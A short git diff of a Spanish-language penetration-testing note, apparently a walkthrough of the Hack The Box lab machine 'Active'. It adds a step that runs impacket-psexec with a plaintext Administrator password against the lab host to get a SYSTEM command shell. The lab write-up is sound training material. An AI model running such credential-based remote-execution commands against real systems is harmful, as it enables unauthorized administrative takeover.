@@ -136,3 +136,12 @@ Validamos que las credenciales son correctas con [[NETEXEC]]
 ```ad-hint
 Administrator::Ticketmaster1968
 ```
+
+
+# Acceso privilegiado
+Para el acceso inicial con las credenciales validas podemos usar [[IMPACKET]]
+```shell
+impacket-psexec active.htb/Administrator:Ticketmaster1968@10.129.9.24 cmd.exe
+```
+
+Obteniendo así una CMD como `NT-AUTHORITY SYSRTEM`
